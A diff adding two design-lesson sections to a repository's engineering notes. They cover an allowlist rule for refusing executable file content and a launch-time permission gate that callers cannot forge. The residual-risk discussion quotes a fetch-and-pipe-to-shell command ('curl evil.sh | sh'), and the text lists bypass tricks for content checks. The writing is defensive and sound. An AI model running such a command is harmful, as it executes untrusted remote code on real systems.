@@ -4474,3 +4474,73 @@ anything that echoes: a command substitution feeding a variable prints nothing, 
 pipeline written to inspect the result prints everything. Rotation, not care, is the remedy
 once a secret has been displayed, because a transcript and a provider's logs are not files you
 can delete.
+
+---
+
+## 190. A content rule written as a denylist of known-bad shapes is defeated by the shapes nobody listed; write it as an allowlist of what can be proved inert
+
+Building the `file` survey question needed a rule for refusing executable content. The first
+sketch was the obvious one: a table of magic numbers (`\x7fELF`, `MZ`, `PK\x03\x04`, `\x1f\x8b`)
+plus a `#!` test. A design panel run in parallel killed it, and the argument is worth keeping
+because it generalises well past this feature.
+
+A denylist fails OPEN on everything absent from it. Every named bypass of a check like this lives
+in that gap: a byte-order mark before the shebang, a UTF-16 export whose ASCII is NUL-interleaved,
+a zip container, a polyglot, a format invented after the table was written. Each one needs its own
+entry, and the entry can only be written by somebody who already thought of it.
+
+An allowlist fails CLOSED on all of them without naming any. The rule that shipped is: valid
+UTF-8, no NUL byte anywhere, no byte-order mark prefix, and `#!` at offset zero exactly. An ELF is
+refused because it carries NUL, not because anybody listed ELF. A container format released next
+year is refused by a rule written today. The classifier's own zero value is the refusing class, so
+a classification that never ran refuses too.
+
+Two second-order rules came with it.
+
+**Refuse a byte-order mark rather than stripping it and re-checking.** Stripping and re-running is
+two passes over two different byte strings, and the desynchronisation between those passes is
+where this class of bug actually lives. Refusing at the mark means there is no second pass.
+
+**Name the flag for what it really governs.** The first name was `AllowExecutableFiles`. After the
+inert rule, the gate governs exactly one thing: whether the text announces itself with `#!`. It
+was renamed `AllowProgramContent` because the first name was a lie, and a flag whose name
+overstates what it does is worse than no flag: it invites the reading that whatever passes is safe.
+
+The residual risk is written into the code rather than into a document, in the "Known, deliberate
+residual risk" form this repository already uses. The check refuses a file that ANNOUNCES itself
+as a program and cannot refuse one that IS one. A text file holding `curl evil.sh | sh` passes
+every test and is accepted with both gates shut, because the dangerous property does not live in
+the bytes: it lives in what the automation does with them, and a runbook may already pipe any
+`text` answer to a shell with no flag at all. What the two gates buy is separation of duty --
+neither is settable by the person launching the job -- and saying so in the file is what stops the
+next reader from mistaking a guardrail for a sandbox.
+
+## 191. A gate that is only checked when a record is authored is not a gate; check it where the thing happens, and make the caller unable to supply it
+
+The `file` question's system-level permission is an environment variable the Controller reads at
+startup. The tempting place to enforce it is `Survey.Validate`, at save time: the template author
+gets an immediate error, and the check is one line.
+
+That would have been an authoring lint wearing a gate's name. A template authored while the
+deployment consented keeps its flag; withdrawing the consent would stop NEW templates being
+written and do nothing about every template already in production, which is the population that
+matters. So the deployment's half is consulted at LAUNCH, from a value threaded into the
+dispatcher at startup, and clearing the variable plus a restart immediately stops templates that
+already carry the flag. There is a test that asserts exactly that, with the template held
+identical across both halves and only the Controller's configuration differing.
+
+The second half is the one that makes the pair a real separation of duty. The policy rides
+`launch.Config`, and a `Config` is built by callers. The dispatcher therefore ASSIGNS it
+immediately before resolving, overwriting whatever the caller put there, rather than defaulting it
+when absent. A defaulting version passes every obvious test and lets anybody who can construct a
+Config grant themselves the deployment's consent -- which is one of the two gates. Proving that
+took a deliberate negative control: replacing the assignment with `if cfg.FilePolicy == zero` made
+the forgery test fail and nothing else, which is the shape of a test worth keeping.
+
+`pkg/remoteexec/knownhosts.go` already argued against exactly this kind of environment variable
+for host-key verification: "Deliberately a PATH and never a POLICY... an operator who sets a
+variable once forgets it, while a task parameter is written in the runbook next to the command it
+applies to and shows up in review." The distinction here is real and should be weighed rather than
+assumed: the variable alone permits nothing, and the thing it consents to IS a per-record
+parameter that shows up in review. The startup WARN exists because the "sets it once and forgets"
+failure is the same one.
